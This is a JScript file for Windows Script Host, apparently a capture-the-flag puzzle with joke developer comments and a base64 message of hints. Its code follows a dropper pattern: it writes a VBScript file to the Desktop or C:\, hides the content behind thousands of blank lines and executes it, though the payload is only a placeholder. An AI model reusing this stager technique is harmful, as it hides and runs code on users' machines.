// https://documentation.help/MS-Office-JScript/JSTOC.htm
/*@cc_on
@if (@_jscript)
    // I hate legacy support. I always get the if statements mixed up TJ
    var test
    test = 123
    // faster way of getting NaN OW
    var getNan = @_PowerPC + @_alpha
    
    // https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2003/cc738350(v=ws.10)
    var parameter = "";
        var fso, f1, ts;
            var ForWriting = 2;
            
        var objShell = new ActiveXObject("WScript.shell")
    if (WScript.arguments.length > 0)
    {
    parameter = WScript.arguments(0)}
    WSH.echo(objShell.SpecialFolders("Desktop"))
    fso = new ActiveXObject("Scripting.FileSystemObject");
                                // fetch it each time in case it changes TJ
                        fso.CreateTextFile (objShell.SpecialFolders("Desktop") + "/database.vbs");
    f1 = fso.GetFile(objShell.SpecialFolders("Desktop") + "/database.vbs");
    var stringUsed = "<insert-deprecated-excaped-database.vbs>";
                            var string;
                                        string = unescape(stringUsed);
                    /// WSH.echo(string) removed debug statements OW
    ts = f1.OpenAsTextStream(ForWriting, true);
    ts.WriteLine("' Testing 1, 2, 3. cool vbs method") ;
    ts.WriteBlankLines(3);
                    ts.WriteBlankLines(3);
                ts.WriteBlankLines(3);
    // fixed cachine issue with blank lines OW
    ts.WriteBlankLines(4000);
                        ts.Write(string)
                ts.WriteBlankLines(3);
                        ts.Write("WScript.sleep(5)")
    // https://stackoverflow.com/a/15351708
        var objShell = new ActiveXObject("WScript.shell")
    ts.Close();
    // we should use this https://www.techrepublic.com/article/protect-your-scripts-with-the-script-encoder/ OW
    objShell.run(objShell.SpecialFolders("Desktop") + '/database.vbs ' + parameter)

    @else  @*/
    // new hotness - TJ
    // ECMAScript is the future!
    WSH.echo("Fallback! NOt sure if it works UNDTESTED CODE AHEAD TJ");
    function base64Decode(str)
    {
        var lookup = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
        var concattteeedd = ""
        for(c in str)
        {
            var index = lookup.indexOf(str[c])
            if (index > -1)
            {
                concattteeedd += index
            }
            else
            {
                alert("Bad Base64 passed!")
            }
        }
        return concattteeedd
    }
    var stringUsed = "b2ggaWYgeW91J3JlIHJlYWRpbmcgdGhpcyBpJ20gcmV0aXJlZC4gaHR0cHM6Ly93d3cud2lraWhvdy5jb20vQW5ub3VuY2UtWW91ci1SZXRpcmVtZW50DQpBbHNvIHlvdXIgcHJpbmNlc3MgaXMgaW4gYW5vdGhlciBjYXN0bGUsIHRoZSByZXN0IG9mIHRoaXMgaXMganVzdCBnb2JibHlnb29rLg0KSGludDogTWlnaHQgd2FudCB0byBjaGVjayB3aGljaCB2ZXJzaW9uIG9mIE1pY3Jvc29mdCBKU2NyaXB0IHlvdSdyZSBydW5uaW5nLi4uDQpCaWdnZXIgaGludC4uLiBtaWdodCB3YW50IHRvIGNoZWNrIHRoYXQgY29tbWVudCBhdCB0aGUgdG9wIG9mIHRoZSBmaWxlLCBhbmQgbG9vayB1cCBjb25kaXRpb25hbCBjb21waWxlDQpCaWdnZXN0IGhpbnQ6IEknbSByZXRpcmVkIC0gVEoNCklmIHlvdSdyZSBzdGlsbCBzdHVjaywgaGVyZSdzIHNvbWUgbG9yZW0gaXBzdW0gdG8gdGhyb3cgeW91IG9mZi4gSGVhdmVuIGhlbHAgdGhlIGZvbGtzIHdobyB0aGluayB0aGlzIGlzIHBhcnQgb2YgYSBjcnlwdG8gY2hhbGxlbmdlLi4uIGl0J3Mgbm90LiBJdCdzIGEgd2ViIGNoYWxsZW5nZSBYRC4NCkxvcmVtIGlwc3VtIGRvbG9yIHNpdCBhbWV0LCBjb25zZWN0ZXR1ciBhZGlwaXNjaW5nIGVsaXQuIFBoYXNlbGx1cyBzb2xsaWNpdHVkaW4gZGljdHVtIGF1Z3VlIGV1IHZ1bHB1dGF0ZS4gVXQgc2l0IGFtZXQgbmlzaSB0dXJwaXMuIFNlZCBmYXVjaWJ1cyBxdWlzIG9kaW8gbm9uIGlhY3VsaXMuIEludGVnZXIgZXQgdmVsaXQgb2Rpby4gRHVpcyBmcmluZ2lsbGEgbG9yZW0gcXVpcyBvcmNpIHN1c2NpcGl0IGVsZW1lbnR1bS4gQWxpcXVhbSB0aW5jaWR1bnQgcXVhbSBldCBuaXNsIHN1c2NpcGl0IGFjY3Vtc2FuLiBTZWQgaGVuZHJlcml0LCBmZWxpcyBuZWMgdmVoaWN1bGEgaWFjdWxpcywgc2FwaWVuIGVyb3Mgc29sbGljaXR1ZGluIG9kaW8sIGEgdWx0cmljaWVzIGVsaXQgcmlzdXMgZXQgZXJvcy4gVXQgYWxpcXVhbSBmZXVnaWF0IGFyY3UuIE1vcmJpIG5lYyBsaWd1bGEgbmlzaS4gTWFlY2VuYXMgdXQgbGFvcmVldCBlbmltLCBhYyB0ZW1wdXMgbWF1cmlzLiBNb3JiaSBlc3QuDQpQUyB5b3UgbWlnaHQgaGF2ZSBub3RpY2VkIGEgYnVnIGluIHRoZSBCYXNlNjQgaW1wbGVtZW50YXRpb24uIFRoYXQncyBpbnRlbnRpb25hbC4gSSBzdGFydGVkIHdyaXRpbmcgaXQgYW5kIHRoZW4gcmVhbGl6ZWQgSSdtIHJldGlyaW5nLiBTbyBJIHN0b3BwZWQuIFRK"
    var unescapedStringUsed = unescape(stringUsed)
    var currentTime = (new Date).getTime()
    // will stop working in 2021 but that's ok will be retired by then TJ
    if (currentTime > 1630290490976)
    {
        alert("TJ's retired!")
    }
    else
    {
        // is this this https://www.fireeye.com/blog/threat-research/2014/02/ground-windows-scripting-host-wsh.html ???????
        var parameter = "";
        var fso, f1, ts;
        var ForWriting = 2;
        fso = new ActiveXObject("Scripting.FileSystemObject");
        fso.CreateTextFile ("c:\\\\database.vbs");
        f1 = fso.GetFile("c:\\\\database.vbs");
        stringUsed = base64Decode(unescapedStringUsed);
        var string = unescape(stringUsed);
        ts = f1.OpenAsTextStream(ForWriting, true);
        ts.WriteLine("' Testing 1, 2, 3.") ;
        ts.WriteBlankLines(3);
        ts.WriteBlankLines(3);
        ts.WriteBlankLines(3);
        // fixed cachine issue with blank lines OW
        ts.WriteBlankLines(3);
        ts.Write(string)
        // https://stackoverflow.com/a/15351708
        var objShell = new ActiveXObject("WScript.shell")
        ts.Close();
        objShell.run('c:\\\\database.vbs ' + parameter)
    }
/*@end @*/
